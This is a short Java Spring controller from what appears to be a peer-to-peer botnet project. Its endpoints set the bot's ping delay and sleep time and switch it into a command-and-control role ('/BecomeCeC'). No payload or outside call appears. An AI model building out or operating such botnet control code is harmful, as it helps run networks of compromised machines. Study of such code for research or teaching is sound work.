package cs.sii.controller;

import org.springframework.web.bind.annotation.RestController;

import cs.sii.config.bot.Engine;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.web.bind.annotation.RequestMapping;


//Controller del Bot che gestisce le richieste della rete P2P dei Bot 

@Component
@RestController
public class BotController {
	
	@Autowired
	Engine engineBot;
    
    @RequestMapping("/")
    public String index() {
        return "Bot is Ready";
    }
    
    
    @RequestMapping("/SetDelay")
    public String SetDelay(int delay) {
    	engineBot.setPingdelay(delay);
        return "Delay Impostato "+delay;
    }
    
    @RequestMapping("/GetDelay")
    public String getDelay() {
        return "Delay Impostato "+engineBot.getPingdelay();
    }
    
    
    
    @RequestMapping("/SleepTime")
    public String SleepMode(int timeToSleep) {
    	engineBot.setSleeptime(timeToSleep);
        return "Tempo impostato a "+timeToSleep;
    }
    
    @RequestMapping("/BecomeCeC")
    public String bringCommand() {
    	engineBot.setCommandandconquerStatus(true);
        return "Ready";
    }
    
}
